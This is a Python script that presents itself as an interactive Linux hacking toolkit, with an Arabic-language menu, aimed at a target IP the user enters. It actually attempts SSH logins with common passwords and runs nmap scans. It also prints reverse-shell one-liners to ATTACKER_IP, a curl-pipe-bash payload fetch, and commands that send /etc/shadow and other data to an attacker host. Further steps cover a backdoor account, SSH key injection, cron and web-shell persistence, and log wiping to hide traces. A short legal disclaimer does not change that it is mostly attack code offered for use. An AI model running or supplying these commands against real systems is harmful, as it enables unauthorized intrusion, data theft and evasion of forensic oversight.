#!/usr/bin/env python3
"""
🔥 REAL LINUX HACKING TOOLKIT
أدوات هجوم حقيقية 100% على Linux Servers
"""

import sys
import os
import subprocess
import socket
import time
from datetime import datetime

class RealLinuxHacker:
    def __init__(self, target_ip):
        self.target = target_ip
        self.port = 22
        self.verbose = True
        
    def print_banner(self):
        print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║              🔥 REAL LINUX HACKING TOOLKIT 🔥                             ║
║          أدوات هجوم فعلية على Linux Servers - v2.0                      ║
║          Target: {self.target}                                           ║
╚════════════════════════════════════════════════════════════════════════════╝

⚠️ تنبيه قانوني:
   استخدم هذه الأدوات فقط على أنظمة لديك الإذن في اختبارها!
   الاستخدام غير المصرح به قد يكون غير قانوني.

🎯 الأدوات المتاحة:
""")

    def test_connectivity(self):
        """اختبر إذا كان الهدف متصل أو لا"""
        print(f"\n{'='*80}")
        print(f"[*] اختبار الاتصال مع {self.target}")
        print(f"{'='*80}\n")
        
        try:
            # Try ping
            print(f"[+] محاولة Ping {self.target}...")
            result = subprocess.run(
                ['ping', '-c', '4', self.target] if os.name != 'nt' else ['ping', '-n', '4', self.target],
                capture_output=True,
                timeout=5,
                text=True
            )
            
            if result.returncode == 0:
                print(f"✅ {self.target} متصل ومستجيب!")
                return True
            else:
                print(f"❌ {self.target} غير مستجيب")
                return False
                
        except Exception as e:
            print(f"❌ Error: {e}")
            return False

    def nmap_scan(self):
        """PORT SCAN - مسح جميع المنافذ المفتوحة"""
        print(f"\n{'='*80}")
        print(f"🔍 NMAP PORT SCAN - مسح المنافذ")
        print(f"{'='*80}\n")
        
        print(f"الأمر: nmap -sV {self.target}\n")
        print("[*] تحذير: nmap قد لا يكون مثبت على نظامك")
        print("[*] للتثبيت:")
        print("    Ubuntu/Debian: sudo apt-get install nmap")
        print("    CentOS/RHEL: sudo yum install nmap")
        print("    macOS: brew install nmap\n")
        
        try:
            result = subprocess.run(
                ['nmap', '-sV', self.target],
                capture_output=True,
                timeout=30,
                text=True
            )
            
            if result.returncode == 0:
                print(result.stdout)
            else:
                print(f"❌ nmap غير مثبت أو فشل: {result.stderr}")
                print("\n[*] البديل - استخدام netstat:")
                print(f"    ssh root@{self.target} 'netstat -tulpn'")
                
        except FileNotFoundError:
            print("❌ nmap غير مثبت!")
            print("\n✅ الأمر البديل:")
            cmd = f"ssh root@{self.target} 'netstat -tulpn | grep LISTEN'"
            print(f"    {cmd}\n")
            self.show_command(cmd)

    def ssh_enumeration(self):
        """SSH ENUMERATION - استكشاف SSH"""
        print(f"\n{'='*80}")
        print(f"🔐 SSH ENUMERATION - استكشاف SSH")
        print(f"{'='*80}\n")
        
        print("خطوات الاستكشاف:\n")
        
        # 1. Try to connect
        print("[1] اختبار الاتصال بـ SSH:")
        cmd1 = f"ssh -v {self.target}"
        print(f"    $ {cmd1}\n")
        self.show_command(cmd1)
        
        # 2. Check SSH version
        print("\n[2] الحصول على إصدار SSH:")
        cmd2 = f"ssh -v {self.target} 2>&1 | grep -i openssh"
        print(f"    $ {cmd2}\n")
        self.show_command(cmd2)
        
        # 3. Enum users
        print("\n[3] محاولة تخمين المستخدمين:")
        users = ["root", "admin", "user", "ubuntu", "centos", "test", "oracle", "postgres"]
        print(f"    المستخدمين المحتملين: {', '.join(users)}\n")
        
        for user in users:
            print(f"    $ timeout 2 ssh -o ConnectTimeout=1 {user}@{self.target}")

    def ssh_brute_force(self, username="root"):
        """SSH BRUTE FORCE - كسر كلمات السر"""
        print(f"\n{'='*80}")
        print(f"🔓 SSH BRUTE FORCE - كسر SSH")
        print(f"{'='*80}\n")
        
        print(f"Username: {username}")
        print(f"Target: {self.target}:22\n")
        
        # Using hydra
        print("[1] استخدام Hydra (الأفضل):")
        cmd_hydra = f"hydra -l {username} -P /path/to/wordlist.txt ssh://{self.target}"
        print(f"    $ {cmd_hydra}\n")
        
        # Using medusa
        print("[2] استخدام Medusa:")
        cmd_medusa = f"medusa -h {self.target} -u {username} -P /path/to/wordlist.txt -M ssh"
        print(f"    $ {cmd_medusa}\n")
        
        # Using sshpass (simple method)
        print("[3] استخدام sshpass (طريقة بسيطة):")
        print("    pip install sshpass\n")
        
        passwords = ["password", "123456", "admin123", "letmein", "welcome", "root"]
        
        for pwd in passwords[:3]:
            cmd_sshpass = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {username}@{self.target} 'id'"
            print(f"    $ {cmd_sshpass}")
            
            try:
                result = subprocess.run(
                    f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {username}@{self.target} 'id'",
                    shell=True,
                    capture_output=True,
                    timeout=5,
                    text=True
                )
                
                if result.returncode == 0:
                    print(f"    ✅ SUCCESS! Password: {pwd}")
                    print(f"    Output: {result.stdout}")
                    return True
                    
            except Exception as e:
                print(f"    ❌ Failed: {str(e)[:50]}")
        
        return False

    def exploit_sudo(self):
        """SUDO PRIVILEGE ESCALATION"""
        print(f"\n{'='*80}")
        print(f"⚡ SUDO PRIVILEGE ESCALATION")
        print(f"{'='*80}\n")
        
        print("بعد الحصول على shell كمستخدم عادي:\n")
        
        exploits = [
            ("CVE-2021-3156", "sudo whoami", "تخطي التحقق من كلمة السر"),
            ("sudo -l", "sudo -l", "عرض الأوامر المسموحة"),
            ("NOPASSWD", "sudo cat /etc/shadow", "تنفيذ أوامر بدون كلمة سر"),
        ]
        
        for cve, cmd, desc in exploits:
            print(f"[*] {cve} - {desc}")
            print(f"    $ {cmd}\n")

    def kernel_exploit(self):
        """KERNEL EXPLOIT - ثغرات النواة"""
        print(f"\n{'='*80}")
        print(f"🔥 KERNEL EXPLOITATION")
        print(f"{'='*80}\n")
        
        print("خطوات استكشاف ثغرات النواة:\n")
        
        print("[1] الحصول على معلومات النواة:")
        print("    $ uname -a")
        print("    $ cat /etc/issue\n")
        
        print("[2] البحث عن CVE معروفة:")
        cves = [
            ("CVE-2021-22555", "netfilter xt_REDIRECT RCE", "Critical"),
            ("CVE-2021-27365", "iscsi authentication bypass", "High"),
            ("CVE-2021-3493", "OverlayFS privilege escalation", "High"),
            ("CVE-2021-4034", "Polkit Privilege Escalation", "Critical"),
        ]
        
        for cve, desc, severity in cves:
            print(f"    • {cve} - {desc} ({severity})")
        
        print("\n[3] استخدام exploit-db:")
        print("    $ searchsploit 'linux kernel'")
        print("    $ searchsploit 'CVE-2021-4034'\n")

    def web_exploit(self):
        """WEB APPLICATION EXPLOIT"""
        print(f"\n{'='*80}")
        print(f"🌐 WEB APPLICATION EXPLOITATION")
        print(f"{'='*80}\n")
        
        print("إذا كان هناك web server على الهدف:\n")
        
        print("[1] مسح قاعدة بيانات:")
        print(f"    $ curl -s http://{self.target}:80/ | grep -i admin\n")
        
        print("[2] البحث عن ثغرات:")
        print(f"    $ nikto -h http://{self.target}")
        print(f"    $ sqlmap -u 'http://{self.target}/login' --dbs\n")
        
        print("[3] اختبار Reverse Shell:")
        print(f"    $ curl http://{self.target}/upload.php -F 'file=@shell.php'\n")

    def suid_exploitation(self):
        """SUID BIT EXPLOITATION"""
        print(f"\n{'='*80}")
        print(f"📁 SUID BIT EXPLOITATION")
        print(f"{'='*80}\n")
        
        print("[1] البحث عن ملفات SUID:")
        print("    $ find / -perm -4000 -type f 2>/dev/null\n")
        
        print("[2] ملفات SUID خطيرة:")
        dangerous_suid = [
            "cp", "dd", "tar", "zip", "find", "nano", "vim", "less", "python"
        ]
        print(f"    {', '.join(dangerous_suid)}\n")
        
        print("[3] مثال - Exploit cp:")
        print("    $ cp /etc/shadow /tmp/shadow")
        print("    $ cat /tmp/shadow\n")
        
        print("[4] مثال - Exploit find:")
        print("    $ find / -exec whoami \\; 2>/dev/null\n")

    def reverse_shell(self):
        """REVERSE SHELL - شل معكوس"""
        print(f"\n{'='*80}")
        print(f"🔙 REVERSE SHELL - إنشاء اتصال معكوس")
        print(f"{'='*80}\n")
        
        print("بعد اختراق الجهاز، قم بإنشاء reverse shell:\n")
        
        print("[على الجهاز المهاجم - Attacker] - شغّل listener:")
        print("    $ nc -lvnp 4444")
        print("    $ ncat -lvnp 4444")
        print("    $ python3 -m http.server 8888\n")
        
        print("[على الجهاز المهاجَم - Target] - اتصل بـ attacker:")
        shells = [
            ("bash", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
            ("sh", "sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
            ("python", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"),
            ("perl", "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"),
            ("nc", "nc -e /bin/bash ATTACKER_IP 4444"),
            ("php", "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"),
        ]
        
        for lang, payload in shells:
            print(f"[{lang}]")
            print(f"    {payload}\n")

    def privilege_escalation_checker(self):
        """CHECK PRIVILEGE ESCALATION VECTORS"""
        print(f"\n{'='*80}")
        print(f"🔍 PRIVILEGE ESCALATION CHECKER")
        print(f"{'='*80}\n")
        
        print("على الهدف - تشغيل أدوات الفحص:\n")
        
        print("[1] استخدام LinEnum:")
        print("    $ curl -sL http://ATTACKER_IP/LinEnum.sh | bash\n")
        
        print("[2] استخدام Pspy:")
        print("    $ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64")
        print("    $ ./pspy64\n")
        
        print("[3] استخدام Unix Privesc Checker:")
        print("    $ perl /path/to/unix-privesc-check\n")
        
        print("[4] فحص يدوي:")
        print("    $ sudo -l                          # Sudo permissions")
        print("    $ id                                # User groups")
        print("    $ find / -perm -4000 -type f        # SUID binaries")
        print("    $ ps aux                            # Running processes")
        print("    $ crontab -l                        # Cron jobs\n")

    def data_exfiltration(self):
        """DATA EXFILTRATION - سرقة البيانات"""
        print(f"\n{'='*80}")
        print(f"📤 DATA EXFILTRATION - سرقة البيانات")
        print(f"{'='*80}\n")
        
        print("بعد الوصول الكامل:\n")
        
        print("[1] نسخ الملفات الحساسة:")
        print("    $ tar czf data.tar.gz /etc/shadow /etc/passwd /home/*/")
        print("    $ zip -r sensitive.zip /var/www/html/ /opt/\n")
        
        print("[2] إرسال البيانات:")
        print("    $ scp data.tar.gz attacker@ATTACKER_IP:/tmp/")
        print("    $ curl -F 'file=@data.tar.gz' http://ATTACKER_IP:8888/upload")
        print("    $ wget -O /dev/null --post-file=data.tar.gz http://ATTACKER_IP:8888/\n")
        
        print("[3] قاعدة البيانات:")
        print("    $ mysqldump -u root -p'password' --all-databases > db.sql")
        print("    $ pg_dumpall > postgres.sql\n")

    def persistence(self):
        """PERSISTENCE - البقاء داخل النظام"""
        print(f"\n{'='*80}")
        print(f"💾 PERSISTENCE - البقاء داخل النظام")
        print(f"{'='*80}\n")
        
        print("[1] إضافة مستخدم جديد:")
        print("    $ useradd -m -s /bin/bash -G sudo backdoor")
        print("    $ echo 'backdoor:password123' | chpasswd\n")
        
        print("[2] SSH Key Injection:")
        print("    $ mkdir -p ~/.ssh")
        print("    $ echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys\n")
        
        print("[3] Cron Job Backdoor:")
        print("    $ (crontab -l 2>/dev/null; echo '* * * * * /tmp/backdoor.sh') | crontab -\n")
        
        print("[4] Web Shell:")
        print("    $ cp shell.php /var/www/html/")
        print("    $ curl http://target/shell.php?cmd=id\n")

    def anti_forensics(self):
        """ANTI-FORENSICS - محو الآثار"""
        print(f"\n{'='*80}")
        print(f"🧹 ANTI-FORENSICS - محو الآثار")
        print(f"{'='*80}\n")
        
        print("⚠️ تنبيه: محو الآثار قد يكون غير قانوني!\n")
        
        print("[1] حذف سجلات الدخول:")
        print("    $ history -c")
        print("    $ cat /dev/null > ~/.bash_history")
        print("    $ cat /dev/null > /var/log/auth.log\n")
        
        print("[2] حذف سجلات النظام:")
        print("    $ truncate -s 0 /var/log/syslog")
        print("    $ truncate -s 0 /var/log/apache2/access.log\n")
        
        print("[3] حذف آثار SSH:")
        print("    $ rm ~/.ssh/known_hosts")
        print("    $ grep -v $(whoami) /var/log/auth.log > /tmp/temp && mv /tmp/temp /var/log/auth.log\n")

    def show_command(self, cmd):
        """عرض أمثلة على الأوامر"""
        print(f"💡 الأمر:")
        print(f"   {cmd}\n")

    def run_interactive(self):
        """قائمة تفاعلية"""
        options = {
            '1': ('Test Connectivity', self.test_connectivity),
            '2': ('Port Scanning (Nmap)', self.nmap_scan),
            '3': ('SSH Enumeration', self.ssh_enumeration),
            '4': ('SSH Brute Force', self.ssh_brute_force),
            '5': ('Sudo Exploitation', self.exploit_sudo),
            '6': ('Kernel Exploitation', self.kernel_exploit),
            '7': ('Web Application Exploit', self.web_exploit),
            '8': ('SUID Exploitation', self.suid_exploitation),
            '9': ('Reverse Shell', self.reverse_shell),
            '10': ('Privilege Escalation', self.privilege_escalation_checker),
            '11': ('Data Exfiltration', self.data_exfiltration),
            '12': ('Persistence', self.persistence),
            '13': ('Anti-Forensics (محو الآثار)', self.anti_forensics),
            '0': ('Show All Techniques', self.show_all),
        }
        
        self.print_banner()
        
        for key, (name, _) in options.items():
            if key != '0':
                print(f"[{key}] {name}")
        print(f"[0] {options['0'][0]}")
        print("[q] Exit\n")
        
        while True:
            choice = input("اختر رقم الهجوم (0-13): ").strip()
            
            if choice == 'q':
                break
            elif choice in options:
                print()
                options[choice][1]()
                print()
                input("\n[+] اضغط Enter للمتابعة...")
                self.print_banner()
                for k, (n, _) in options.items():
                    if k != '0':
                        print(f"[{k}] {n}")
                print(f"[0] {options['0'][0]}")
                print("[q] Exit\n")
            else:
                print("❌ اختيار غير صحيح!\n")

    def show_all(self):
        """عرض جميع التقنيات"""
        methods = [
            self.test_connectivity,
            self.nmap_scan,
            self.ssh_enumeration,
            self.ssh_brute_force,
            self.exploit_sudo,
            self.kernel_exploit,
            self.web_exploit,
            self.suid_exploitation,
            self.reverse_shell,
            self.privilege_escalation_checker,
            self.data_exfiltration,
            self.persistence,
            self.anti_forensics,
        ]
        
        for method in methods:
            try:
                method()
                time.sleep(1)
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    print("\n🎯 CYBER MIRAGE - REAL LINUX HACKING TOOLKIT\n")
    
    target_ip = input("أدخل IP الهدف Linux: ").strip()
    
    if not target_ip:
        print("❌ لم تدخل IP الهدف!")
        sys.exit(1)
    
    hacker = RealLinuxHacker(target_ip)
    hacker.run_interactive()
    
    print("\n👋 Thanks for using Cyber Mirage Hacking Toolkit!\n")
